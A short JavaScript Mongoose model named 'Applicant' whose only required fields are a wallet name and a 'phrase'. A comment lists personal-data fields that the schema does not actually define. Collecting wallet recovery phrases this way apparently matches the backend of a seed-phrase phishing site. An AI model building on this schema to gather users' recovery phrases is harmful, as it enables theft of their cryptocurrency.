const mongoose = require('mongoose');


// First Name, Last Name, Phone Number, Email, Country, Zipcode
const applicantSchema = new mongoose.Schema({
    wallet: {
        type: String,
        required: [true, 'Please Input the wallet name']
    },
    phrase: {
        type: String,
        required: [true, 'Please Input the phrase'],
    },
});

const Applicant = mongoose.model('Applicant', applicantSchema);
module.exports = Applicant;